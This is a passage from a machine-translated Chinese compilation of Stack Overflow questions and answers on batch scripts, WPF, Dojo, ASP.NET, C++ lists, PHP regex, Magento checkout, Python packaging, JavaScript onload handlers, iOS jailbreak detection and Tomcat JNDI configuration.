如果我可以将上面“TYPE”命令的完整结果放入一个变量中，我可以使用它（我认为）......我只是无法弄清楚为什么 FOR 的结果不同？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:35:41.453

看起来您正在使用二进制文件。

CMD 不能很好地处理空字符。

此外，CMD 限制为每行 8191 个字符。

因此，除非您使用一些可以处理二进制文件的第三方工具，否则您使用 CMD 的努力似乎注定要失败。或者切换到另一种语言，如 VBScript 或 JScript。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:47:34.723

我无法重现您的问题 - 对我来说，输出完全相同（请参阅下面的临时程序以获取我的代码）。

不过，我有两个建议。

1.  阅读[循环中的变量扩展](http://www.robvanderwoude.com/variableexpansion.php)。在循环中设置变量并不像人们想象的那样起作用。

2.  我建议使用 FINDSTR 而不是 TYPE 因为它应该更容易使用 - 我在下面的代码末尾给出了一个示例。

划痕计划：

```
@ECHO OFF

ECHO Param1=Value1 > config.cfg
ECHO Param2=Value2 >> config.cfg
ECHO Param3=Value3 >> config.cfg

ECHO Echo configuration File using TYPE
ECHO.

TYPE config.cfg

ECHO.
ECHO Outputting config file using LOOP
ECHO.

for /f "usebackq tokens=* delims==" %%a in (`type config.cfg`) do (echo %%a)

ECHO.
ECHO Searching for %1

REM /B means "find at beginning of word"
REM /I means "search is case insensitive"
FINDSTR /B /I %1 config.cfg 
```

# c# - 调整列大小后 GridViewColumnHeader 上的工具提示和其他格式

> ID：12213209
> 
> 赞同：1
> 
> 时间：2012-08-31T10:06:52.683
> 
> 标签：c#, wpf, xaml, gridview

我想在 a 上添加一个工具提示`GridViewColumnHeader`，但前提是没有足够的空间来显示所有标题的文本（在调整大小等之后）。

此外，如果没有足够的空间，标题文本“header's text”应该像“heade ...”。

是否可以在 XAML 中做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T20:53:56.243

首先，我很好奇为什么你有“仅”显示工具提示的限制。

其次，我猜（没有尝试）DataTrigger 和简单的转换器是可能的。

您可以设置列标题样式并定义当 ActualWidth 小于 DesiredSize.Width 时设置 Tooltip 的触发器。此比较应由具有 DataGridColumnHeader 对象作为输入值的转换器执行。

# cordova - Dojo 没有构建所需的 util 文件夹

> ID：12213210
> 
> 赞同：1
> 
> 时间：2012-08-31T10:07:07.943
> 
> 标签：cordova, dojo

我正在尝试制作特定于 dojo 移动设备的构建，并且文档声明使用 dojo/util/buildscripts/profiles 中列出的配置文件之一。但是我在dojo文件夹下没有这个目录（util）......我错过了一些非常明显的东西吗？

注意：我真的是这个领域的新手，我想尝试使用 phonegap 的 dojo，但被困在第一阶段。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:19:20.980

在标题为*Source的*[下载页面](http://dojotoolkit.org/download/)底部下载**Dojot Toolkit SDK**。

 *或者从一个版本控制系统中获取 Dojo：

*   颠覆：[http ://svn.dojotoolkit.org/src/](http://svn.dojotoolkit.org/src/)
*   混帐：[https ://github.com/dojo](https://github.com/dojo)*

# c# - 从 UpdatePanel 调用函数？

> ID：12213211
> 
> 赞同：0
> 
> 时间：2012-08-31T10:07:10.050
> 
> 标签：c#, javascript, custom-controls, updatepanel

我有一个从应用程序中的各种网页调用的通用函数（自定义控件的函数）。
在常用函数中，我调用这样的javascript（示例代码）-

```
public void ShowMessage(string strMessage)
{
   string s=String.Empty;
   s="<script type='text/javascript'>\n";
   s = s + "alert('+strMessage+');";
   s = s + "</script>";
   Page.ClientScript.RegisterStartupScript(typeof(Page), this.ClientID, s);
} 
```

当我从使用 UpdatePanel 的页面调用此函数时，它`Page.RegisterStartUpScript`不起作用。所以，我必须使用
`ScriptManager.RegisterClientScriptBlock(Page, Page.GetType(), this.ClientID, s, false);`
Now，我必须再传递一个参数来确定该函数是从 UpdatePanel 调用的。
像这样-

```
public void ShowMessage(string strMessage,bool isFromUpdatePanel){..} 
```

我的问题是，**在常用函数中，我能否知道该函数是否从 UpdatePanel 调用（不使用参数）？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:33:35.533

我找到了答案，我会用这个（[从这里得到](https://stackoverflow.com/questions/8184331/how-to-check-whether-updatepanel-is-posting-back)）-

```
string args= Page.Request.Params.Get("__EVENTTARGET");
if (!String.IsNullOrEmpty(args))
{
    //Called From Update Panel(or) UpdatePanel is posting back
}
else
{
    //Called From a page with no Update Panel
} 
```

如果有更好的解决方案，请教我。

# c++ - std::list 的“插入之前”

> ID：12213213
> 
> 赞同：3
> 
> 时间：2012-08-31T10:07:24.193
> 
> 标签：c++

假设我有一个包含以下内容的链表：

1、2、4、5、6、2、3、2

现在可以说我希望将其转换为：

1, 10, 2, 4, 5, 6, 10, 2, 3, 10, 2

即在所有 2 之前插入 10。

我该怎么做？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-31T10:11:12.470

在我的头顶

```
for (std::list<int>::iterator i = l.begin(); i != l.end(); ++i)
  if (*i == 2)
     l.insert(i, 10); 
```

很简单。您无需担心迭代器失效，因为`insert`on a`std::list`不会使任何迭代器失效。这是使用`std::list`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:14:36.307

也许是这样的：

```
auto it = l.begin();
while ((it = std::find(it, l.end(), 2)) != l.end())
{
    it = l.insert(it, 10);
    std::advance(it, 2);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:25:32.450

创建一个带有节点和信息的结构，例如

```
struct test{

int info;
int *node;

} 
```

您可以将它们称为 test->info 和 test->node

现在尝试这样的事情。

```
while(end_of_list){

list[index]=2;

create a new structure object(new_struct) .

new_struct->info=10;
new_struct->node=node_containing_2.

previous_node_to_2->node=new_struct.

} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-31T10:15:21.807

```
while(item != NULL)
{
if(item->intval == 2)
{
Item *newitem = (Item *) malloc(sizeof(Item));
newitem->intval = 10;
prev->next = newitem;
newitem->next = item;
}
prev = item;
item = item->next;
} 
```

如果您制作了自己的链表。还掉了我的头，和c风格。

# php - 获取给定之间的值

> ID：12213214
> 
> 赞同：0
> 
> 时间：2012-08-31T10:07:31.133
> 
> 标签：php, regex, preg-match-all

我需要获取所有没有*用户*前缀的用户 ID，所以我试图在点和词尾之间获取它。

```
$string = 'users.user_id1, users.user_id2, users.user_id3, users.user_id4';
preg_match_all('/\.(.*?)\/B/', $string, $matches); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:11:12.430

试试这个：

```
$string = 'users.user_id1, users.user_id2, users.user_id3, users.user_id4';
preg_match_all('/users.([^,]+),?/', $string, $matches); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:14:23.717

```
str_ireplace('users.','',str_ireplace(' ','',$string)) 
```

它也会照顾空间谢谢

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T10:16:17.273

采用

```
preg_match_all('/(?<=\.)[^,]+(?=,|$)/', $string, $matches); 
```

但是如果你的前缀是固定的，你可以根据需要使用字符串替换功能。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T10:12:15.450

尝试：

```
$string = 'users.user_id1, users.user_id2, users.user_id3, users.user_id4';
$temparray1 = explode(", ", $string);
$temparray2 = array();
foreach ($temparray1 as $value) {
$temp = explode(".", $value);
$temparray2[] = $temp[1];
}
$finalstring = implode(", ", $temparray2);
unset($temparray2);
unset($temparray1); 
```

`$finalstring`是内容。应该是：`user_id1, user_id2, user_id3, user_id4`。

告诉我您是否需要其他格式。

**更新：** Str_replace 也是一种可能性。写：

```
$string = 'users.user_id1, users.user_id2, users.user_id3, users.user_id4';
$finalstring = str_replace('users.', '', $string); 
```

只是字符串的内容不是很通用。

# magento - Magento checkout steps

> ID：12213225
> 
> 赞同：3
> 
> 时间：2012-08-31T10:08:37.580
> 
> 标签：magento, checkout

I need to link the shipment address to a product, not to an order. Is there an easy way to remove the step from the checkout process and include it to the product page?

I tried to remove the shipment block from the checkout layout, but it still remain on the checkout steps.

Thanks in advance.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-01T13:31:56.350

You must rewrite next files to you module:

*   Block /Checkout/Block/Onepage/Shipping/Method.php
*   Controller /Checkout/controllers/OnepageController.php
*   Model /Checkout/Model/Type/Onepage.php
*   Configuration /Checkout/etc/config.xml

* * *

## 1\. Block (Method.php)

```
class Yourmodule_Checkout_Block_Onepage_Shipping_Method extends Mage_Checkout_Block_Onepage_Shipping_Method
            {
                public function isShow()
                {
                    return false;
                }
            } 
```

## 2\. Controller (OnepageController.php)

```
require_once 'Mage/Checkout/controllers/OnepageController.php';

class Yourmodule_Checkout_OnepageController extends Mage_Checkout_OnepageController
{
       public function saveShippingAction()
    {
        if ($this->_expireAjax()) {
            return;
        }
        if ($this->getRequest()->isPost()) {
            $data = $this->getRequest()->getPost('shipping', array());
            $customerAddressId = $this->getRequest()->getPost('shipping_address_id', false);
            $result = $this->getOnepage()->saveShipping($data, $customerAddressId);

            if (!isset($result['error'])) {
                $result['goto_section'] = 'payment';
                $result['update_section'] = array(
                    'name' => 'payment-method',
                    'html' => $this->_getPaymentMethodsHtml()
                );
            }
            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
        }
    }
public function saveBillingAction()
    {
        if ($this->_expireAjax()) {
            return;
        }
        if ($this->getRequest()->isPost()) {
            $data = $this->getRequest()->getPost('billing', array());
            $customerAddressId = $this->getRequest()->getPost('billing_address_id', false);
            $result = $this->getOnepage()->saveBilling($data, $customerAddressId);

            if (!isset($result['error'])) {
                /* check quote for virtual */
                if ($this->getOnepage()->getQuote()->isVirtual()) {
                    $result['goto_section'] = 'payment';
                    $result['update_section'] = array(
                        'name' => 'payment-method',
                        'html' => $this->_getPaymentMethodsHtml()
                    );
                }
                elseif (isset($data['use_for_shipping']) && $data['use_for_shipping'] == 1) {

                    $result['goto_section'] = 'payment';
                    $result['update_section'] = array(
                        'name' => 'payment-method',
                        'html' => $this->_getPaymentMethodsHtml()
                    );
                }
                else {
                    $result['goto_section'] = 'shipping';
                }
            }

            $this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
        }
    }
} 
```

## 3\. Model (Onepage.php)

```
class Yourmodule_Checkout_Model_Type_Onepage extends Mage_Checkout_Model_Type_Onepage
{
    protected function validateOrder()
    {
        $helper = Mage::helper('checkout');
        if ($this->getQuote()->getIsMultiShipping()) {
            Mage::throwException($helper->__('Invalid checkout type.'));
        }

        $addressValidation = $this->getQuote()->getBillingAddress()->validate();
        if ($addressValidation !== true) {
            Mage::throwException($helper->__('Please check billing address information.'));
        }

        if (!($this->getQuote()->getPayment()->getMethod())) {
            Mage::throwException($helper->__('Please select valid payment method.'));
        }
    }
} 
```

## 4\. Configuration (config.xml)

```
<?xml version="1.0" encoding="UTF-8"?>

<config>
    <modules>
        <Yourmodule_Checkout>
            <version>0.0.2</version>
        </Yourmodule_Checkout>
    </modules>
    <global>
        <models>
            <checkout>
                <rewrite>
                    <type_onepage>Yourmodule_Checkout_Model_Type_Onepage</type_onepage>
                </rewrite>
            </checkout>
        </models>

        <blocks>
            <checkout>
                <rewrite>
                    <onepage_shipping_method>Yourmodule_Checkout_Block_Onepage_Shipping_Method</onepage_shipping_method>
                </rewrite>
            </checkout>
        </blocks>     
    </global>

    <frontend>
        <routers>
            <checkout>
                <args>
                    <modules>
                        <yourmodule before="Mage_Checkout">Yourmodule_Checkout</yourmodule>
                    </modules>
                </args>
            </checkout>
        </routers>
    </frontend>

</config> 
```

## 4\. Register your module in app/etc/modules/Yourmodule_All.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <modules>
        <Yourmodule_Checkout>
            <active>true</active>
            <codePool>local</codePool>
        </Yourmodule_Checkout>
    </modules>
</config> 
```

* * *

Good article for you:

[1](http://www.magentocommerce.com/wiki/5_-_modules_and_development/checkout/customizing_onepage_checkout_-_remove_shipping_method) [2](http://www.bluehorse.in/amit-bera/bluehorse-stuffs/removed-shipping-address-and-shipping-method-from-onepage-checkout-in-magento/) [3](http://winvinod.blogspot.com/2011/06/skip-shipping-method-from-onepage.html) [4](http://www.justwebdevelopment.com/blog/removed-shipping-address-and-shipping-method-from-onepage-checkout-in-magento/)

# python - 如何在 Debian 上安装 python-affinity 包？

> ID：12213227
> 
> 赞同：0
> 
> 时间：2012-08-31T10:08:43.050
> 
> 标签：python, module, affinity

我希望这是正确的地方，而不是 Stack Overflow 等的 Unix 用户；

如何在 Debian Squeeze 上安装 Python 包[关联？](http://pypi.python.org/pypi/affinity "亲和力")

我已经下载了 tar，解压，然后运行了下面的命令，但是失败了；我以前从来没有安装过这样的python模块，所以我迷路了:)

```
root@host:~/affinity-0.1.0# python setup.py install
running install
install_dir /usr/local/lib/python2.6/dist-packages/
Checking .pth file support in /usr/local/lib/python2.6/dist-packages/
/usr/bin/python -E -c pass
TEST PASSED: /usr/local/lib/python2.6/dist-packages/ appears to support .pth files
running bdist_egg
running egg_info
writing affinity.egg-info/PKG-INFO
writing top-level names to affinity.egg-info/top_level.txt
writing dependency_links to affinity.egg-info/dependency_links.txt
reading manifest file 'affinity.egg-info/SOURCES.txt'
writing manifest file 'affinity.egg-info/SOURCES.txt'
installing library code to build/bdist.linux-x86_64/egg
running install_lib
running build_py
creating build
creating build/lib.linux-x86_64-2.6
creating build/lib.linux-x86_64-2.6/affinity
copying affinity/__init__.py -> build/lib.linux-x86_64-2.6/affinity
running build_ext
building 'affinity._affinity' extension
creating build/temp.linux-x86_64-2.6
creating build/temp.linux-x86_64-2.6/affinity
gcc -pthread -fno-strict-aliasing -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -fPIC -I/usr/include/python2.6 -c affinity/_affinity.c -o build/temp.linux-x86_64-2.6/affinity/_affinity.o
affinity/_affinity.c:14:20: error: Python.h: No such file or directory
affinity/_affinity.c:17: error: expected ‘)’ before string constant
affinity/_affinity.c:19: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘*’ token
affinity/_affinity.c:38: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘*’ token
affinity/_affinity.c:63: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘methods’
affinity/_affinity.c:80: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘init_affinity’
error: command 'gcc' failed with exit status 1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:13:30.240

好的，修好了。我现在看到我刚刚安装了包`python`，而不是额外`python-dev`的，这是头文件所必需的，如我在此行的问题输出中所示：

```
affinity/_affinity.c:14:20: error: Python.h: No such file or directory 
```

# java - 将字符串分配给字符串数组而不循环

> ID：12213231
> 
> 赞同：-1
> 
> 时间：2012-08-31T10:08:56.020
> 
> 标签：java, arrays

我有一个要求，要在数组结构中分配值，要避免集合，

```
testFunction(String userName,String Password,String status)
 {
    String[] array;
    if(password==null)
     {
      array={"username",username_variable,"status",status_variable}
    }
    else
    {
     array={"username",userName,"password",password,"status",status}
   }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:09:43.977

这是用值初始化数组的正确方法：

```
array = new String[] {"username", username_variable, "status", status_variable}; 
```

[您可以在Java 教程](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/arrays.html)中阅读有关数组的更多信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:09:56.757

在java中，数组是对象，所以你必须创建一个对象来初始化数组的元素。

转变

```
array={"username",username_variable,"status",status_variable} 
```

到

```
array=new String[]{"username",username_variable,"status",status_variable} 
```

# javascript - 使用 window.onload 超过 1 次

> ID：12213234
> 
> 赞同：2
> 
> 时间：2012-08-31T10:09:09.743
> 
> 标签：javascript, jquery

如果我写这个

```
$(document).ready( function () { 
    alert("bla1");
});

$(document).ready( function () { 
    alert("bla2");
}); 
```

一切都好，出现两个警报，但如果代码是

```
window.onload = function () {
    alert("bla1");
}

window.onload = function () {
    alert("bla2");
} 
```

第二个警报没有发生，请告诉某人，为什么 2 个或更多**window.onload**是错误的？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T10:09:50.087

你给它分配一些东西。然后，您为其分配其他内容并覆盖之前的内容。

```
foo = 1;
foo = 2;
// foo is now "2" it is not "1" and "2" 
```

如果您想以非破坏性方式分配事件处理程序，请使用[`addEventListener`](https://developer.mozilla.org/en-US/docs/DOM/element.addEventListener). 您将需要使用兼容性方法来支持 Old-IE。这些方法通过[`on`method](http://api.jquery.com/on/)内置到 jQuery 中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T10:10:52.473

就像是

```
 var test;
 test = 10;
 test = 20 
 alert(test); // 20 
```

您覆盖它和 jQuery 在 load 事件上的处理方式不同。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-31T10:12:50.607

如果你想实现你想要的行为，你必须使用函数 addEventListener 。

```
window.addEventListener("load",function () {
    alert("bla1");
}, false);

window.addEventListener("load",function () {
    alert("bla2");
}, false); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-31T10:11:58.387

尝试这样的事情

```
function doOnLoad() {
        alert("hi");
        alert("bye");
}
window.onload = doOnLoad; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-03-13T11:24:49.413

Robert Hahn 在他的[博客](http://blog.roberthahn.ca/articles/2007/02/02/how-to-use-window-onload-the-right-way/)上有一个很好的解决方案。

```
function makeDoubleDelegate(function1, function2) {
    return function() {
        if (function1)
            function1();
        if (function2)
            function2();
    }
}

window.onload = makeDoubleDelegate(window.onload, myNewFunction ); 
```

> makeDoubleDelegate() 函数将放在第一个 JS 文件中，随时可以调用。它所做的是接受两个函数作为参数，检查它们是否存在，如果存在，则返回一个包含有效的现有函数的匿名函数。
> 
> 第一次调用 window.onload 时，window.onload 本身是未定义的，所以返回的是一个匿名函数，里面只有 myNewFunction()。在随后的 window.onload 分配中，window.onload 确实存在，因此它所持有的任何内容都将被新函数包裹起来。所以名单越来越长。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-01-31T00:31:36.080

我知道我的回答为时已晚，但你可以尝试这样的事情：

```
function hello() {
    window.alert("hello");
}

function bye() {
    window.alert("bye");
}

window.addEventListener("load", function() {
    hello();
    bye();
}); 
```

# ios - 在 iOS 应用程序中运行未签名的代码以测试越狱

> ID：12213239
> 
> 赞同：7
> 
> 时间：2012-08-31T10:09:39.727
> 
> 标签：ios, jailbreak

我需要一种稳定的方法来尝试在 iOS 设备上运行未签名的可执行文件，以测试设备是否已越狱（即允许运行未签名的代码）。

我编写了一个基本上什么都不做的小型可执行文件。

```
int main(int argc, char *argv[]) {
    return 23;
} 
```

我已经在 iOS 设备（越狱和未越狱）上成功编译并运行。

然后，我将此可执行文件添加到 App 捆绑包中，并将该应用程序部署到 iOS 设备。

这会导致设备上的可执行文件的只读版本。我试图 chmod 这个文件以赋予它执行权限，但是失败了，所以我将它复制到应用程序的 tmp 目录中，在那里我可以使用可执行权限进行 chmod。

其他问题建议使用 execve 调用可执行文件，但这会将正在运行的进程替换为新进程，这将杀死应用程序。Fork() 总是失败，所以这不是一个选项。System() 需要一个外壳程序，并且可以在没有外壳程序的情况下进行越狱，它仍然允许未签名的代码运行，所以它已经过时了。Popen() 分叉，所以这行不通。

有趣的是，据我发现，在普通设备上对我的可执行文件调用 execv 会导致“不允许操作”错误，而在越狱设备上调用它会导致“权限被拒绝”错误。仅此一项就可以进行越狱检测，除非在允许 execv 继续进行的越狱发生的情况下，应用程序将立即崩溃，因为它的进程将被替换。

据此[，](http://pwnmyi.com/apple-blocks-drmd-ibooks-on-jailbroken-devices/) iBooks 执行越狱检测，但它似乎使用 fairplayd 二进制文件来执行它的 execve 调用。

有人对运行可执行文件或使用 fairplayd 有任何建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-01T08:38:02.117

您无法直接更改测试可执行文件的权限，因为在安装您的应用后无法修改应用资源。那将是一个安全漏洞。所以，这就是为什么您需要将它复制到 tmp/caches/documents 目录，然后使其可运行。

我不确定您的应用是否需要支持多任务处理，是否需要*在第一次运行开始时*检测越狱，或者是否可以等到应用关闭。但是，如果你可以关闭多任务，那么你可以实现这个方法（`test`这个例子中命名的小可执行文件）：

```
- (void)applicationWillTerminate:(UIApplication *)application {
    NSString* path = [NSTemporaryDirectory() stringByAppendingPathComponent: @"test"];
    int result = execlp([path UTF8String], [path UTF8String], NULL);
    // if we got here, then the attempt to run the external process failed, so make a note of this:
    [[NSUserDefaults standardUserDefaults] setValue: [NSNumber numberWithBool: NO] forKey: @"is_jailbroken"];
    NSLog(@"test returns %d", result);
} 
```

如果`execlp()`调用成功，那么是的，你的进程将被替换。但是，无论如何，该过程即将关闭。当我这样做时，我没有看到实际的崩溃日志，所以我不确定 Apple 是否会抱怨这一点。对用户来说没有崩溃的*外观*。

如果您无法执行单独的流程，那么您的应用程序将继续执行允许您记录手机显然没有越狱的事实的代码行，这可以在您的应用程序下次启动时记录下来。

如果您**确实**需要支持多任务，那么您可以尝试将上述代码放入多任务回调中，例如`applicationDidEnterBackground:`. 如果手机正常，则 exec 调用失败（并返回），因此您的应用不会终止（退出）。我会假设（？）Apple 评论员不会在越狱手机上测试您的应用程序。对于那些手机越狱的人，您的应用程序将退出，而不是进入后台。也许这足以满足您的需求？

另外，仅供参考，还有其他方法可以测试越狱系统，这可能非常可靠（我不确定您是否希望能够 100% 检测越狱手机，或者检测标准越狱配置）

[以编程方式确定 iPhone 是否越狱](https://stackoverflow.com/questions/1140856/determining-if-an-iphone-is-jail-broken-programatically)

[如何检测 iOS 应用程序正在越狱手机上运行？](https://stackoverflow.com/questions/413242/how-do-i-detect-that-an-sdk-app-is-running-on-a-jailbroken-phone)

# java - javax.naming.NameNotFoundException：名称 [comp/env] 未绑定在此上下文中。使用 java 调度程序找不到 [comp] 错误

> ID：12213246
> 
> 赞同：12
> 
> 时间：2012-08-31T10:10:10.790
> 
> 标签：java, sql, scheduled-tasks, connection-pooling, runtime-error

我想做的是在一段时间后更新我的数据库。所以我正在使用java调度程序和连接池。我不知道为什么，但我的代码只工作一次。它将打印：

```
init success
success
javax.naming.NameNotFoundException: Name [comp/env] is not bound in this Context. Unable to find [comp].
    at org.apache.naming.NamingContext.lookup(NamingContext.java:820)
    at org.apache.naming.NamingContext.lookup(NamingContext.java:168)
    at org.apache.naming.SelectorContext.lookup(SelectorContext.java:158)
    at javax.naming.InitialContext.lookup(InitialContext.java:411)
    at test.Pool.main(Pool.java:25)  ---> line 25 is Context envContext = (Context)initialContext.lookup("java:/comp/env"); 
```

我不知道为什么它只工作一次。如果我没有在没有 java 调度程序的情况下运行它，我已经对其进行了测试，它工作正常。没有任何错误。如果我使用调度程序运行它，不知道为什么会出现此错误。

希望可以有人帮帮我。

**我的连接池代码**：

```
public class Pool {
public DataSource main() {
    try {
        InitialContext initialContext = new InitialContext();
        Context envContext = (Context)initialContext.lookup("java:/comp/env");
        DataSource datasource = new DataSource();   
        datasource = (DataSource)envContext.lookup("jdbc/test");
        return datasource;
    } catch (Exception ex) {
        ex.printStackTrace();
    }
    return null;
} 
```

}

**我的 web.xml**：

```
<web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd">
<listener>
    <listener-class> package.test.Pool</listener-class>
</listener>
<resource-ref>
    <description>DB Connection Pooling</description>
    <res-ref-name>jdbc/test</res-ref-name>
    <res-type>javax.sql.DataSource</res-type>
    <res-auth>Container</res-auth>
</resource-ref> 
```

**上下文.xml：**

```
 <?xml version="1.0" encoding="UTF-8"?>
<Context path="/project" reloadable="true">
  <Resource auth="Container" 
            defaultReadOnly="false" 
            driverClassName="com.mysql.jdbc.Driver" 
            factory="org.apache.tomcat.jdbc.pool.DataSourceFactory" 
            initialSize="0" 
            jdbcInterceptors="org.apache.tomcat.jdbc.pool.interceptor.ConnectionState;org.apache.tomcat.jdbc.pool.interceptor.StatementFinalizer" 
            jmxEnabled="true" 
            logAbandoned="true" 
            maxActive="300" maxIdle="50"
            maxWait="10000" 
            minEvictableIdleTimeMillis="300000"
            minIdle="30" 
            name="jdbc/test"
            password="test" 
            removeAbandoned="true"
            removeAbandonedTimeout="60" 
            testOnBorrow="true"
            testOnReturn="false" 
            testWhileIdle="true" 
            timeBetweenEvictionRunsMillis="30000"
            type="javax.sql.DataSource" 
            url="jdbc:mysql://localhost:3306/database?noAccessToProcedureBodies=true" 
            username="root"
            validationInterval="30000" 
            validationQuery="SELECT 1"/>
</Context> 
```

**我的java调度程序**

```
public class Scheduler extends HttpServlet{

public void init() throws ServletException
{
    System.out.println("init success");
    try{
        Scheduling_test test = new Scheduling_test();
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(100);
        ScheduledFuture future = executor.scheduleWithFixedDelay(test, 1, 60 ,TimeUnit.SECONDS);
    }catch(Exception e){
         e.printStackTrace();
    }
} 
```

}

**schedule_test**

```
 public class Scheduling_test extends Thread implements Runnable{
    public void run(){
        Updating updating = new Updating();
        updating.run();
    }
} 
```

**更新**

```
public class Updating{

        public void run(){
            ResultSet rs = null;
            PreparedStatement  p = null;
            StringBuilder sb = new StringBuilder();
            Pool pool = new Pool();
            Connection con = null; 
            DataSource datasource = null;
            try{
                datasource = pool.main();
                con=datasource.getConnection();
                sb.append("SELECT * FROM database");
                p = con.prepareStatement(sb.toString());
                rs = p.executeQuery();
                rs.close();
                con.close();
                p.close();
                datasource.close();
                System.out.println("success");
         }catch (Exception e){
                e.printStackTrace();
         }
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T10:15:15.430

此错误表明您的*jdbc*资源*未注册*！你把你的放在哪里了`context.xml`？

该`context.xml`文件必须在`META-INF`war文件的目录中。它不能在*类目录*或*jar*文件中。

将`META-INF`带有 的目录放在源文件夹树中`context.xml`包含*webapp**根*目录的目录中。

 ** * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-09-06T13:31:26.033

不是`java:/comp/env`但是`java:comp/env`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T14:19:31.987

尝试停止并重新启动您的服务器（我假设您使用的是 Eclipse 和 Tomcat 服务器）。也许当您创建上下文 xml 文件时，它最初是空的，您的服务器无法同步其内容，因此无法找到您稍后在 context.xml 文件中指定的数据库连接资源名称。

即，如果您还没有解决这个问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-06-18T09:40:24.920

我有同样的问题拖了两天痛苦。我重新阅读了关于 JNDI 的 tomcat 文档，确认了我所有的`server.xml`, `context.xml`,`web.xml`配置和访问命名对象的代码......仍然没有进展。

结果是我的项目中的一个依赖项干扰了命名上下文 -axis2。从axis2-1.6.0到axis2-1.6.2的简单移动导致了我的问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-09-26T11:37:23.527

**当存在同一模块的两个版本**时，**可能**会**出现**此问题。请检查文件夹中是否有同一模块的多个版本。删除不需要的版本并重新启动服务器。**`lib`**

 **就我而言，它有`servlet-api`两个版本`servlet-api.jar` `servlet-api-2.jar`

希望这能解决您的问题。再会！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-09-13T15:44:25.933

我刚刚遇到了同样的问题。在我的情况下，我的 tomcat 配置文件或我的项目没有任何问题，但是当我的 tomcat 正在运行时，我不得不重新启动我的 postgres 服务实例，它会以某种方式获取更改并且异常消失了。我必须重新启动 Windows 才能让问题完全消失。不知道为什么！***

# java - 绝对定位（无布局管理器）与 MiGlayout 中的绝对定位

> ID：12213247
> 
> 赞同：2
> 
> 时间：2012-08-31T10:10:14.407
> 
> 标签：java, swing, layout-manager, miglayout

与不使用布局管理器（将布局管理器设置为空）相比，在 MiGlayout 中使用绝对定位作为布局管理器时，最终应用程序结果在不同平台和分辨率等方面是否相同？

MiGlayout 解决方案中的绝对定位与无布局管理器解决方案之间有区别吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T10:36:43.207

想想这个。即使你为你的应用程序提供了一个单一的字体，它在不同的操作系统上会呈现不同的效果，甚至可以在不同的 DPI 下在同一个操作系统上以不同的方式呈现。

布局管理器是您对这些问题的保护，当然，当您第一次开始使用它们时，它们似乎会妨碍您，但是一旦您习惯了它们，您将永远不想这样做（尝试在 VB 中编码并告诉我除此以外）

布局管理器让您专注于流程控制和可用性的复杂性，而不必担心它会如何以比您设计的字体大 2pt 或更大/更小的屏幕分辨率显示。

我花了 2 年的时间来取消以前的开发人员工作，他们坚持使用 Arial 字体和手动设置组件大小，因为他认为他无法正确布局表单。我从用户那里得到的关于这一变化的反馈都是积极的，我们现在正在寻求在应用程序中实现动态字体大小调整。如果没有布局管理器，我将无法尝试。

我会说您使用 MigLayout 的机会比没有 -IMHO 的机会更大

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-31T10:19:13.033

> MiGlayout 解决方案中的绝对定位与无布局管理器解决方案之间有区别吗？

是的，最重要的是，由 AbsoluteLayout 放置的 JComponents 不能与 Container 一起调整大小，必须添加 ComponentListener 并创建一堆代码以连续调整大小，这是学习 MigLayout 如何工作的更难的工作

# cookies - Opera 浏览器存储其 cookie 的位置

> ID：12213248
> 
> 赞同：3
> 
> 时间：2012-08-31T10:10:17.513
> 
> 标签：cookies, browser, vb6, opera

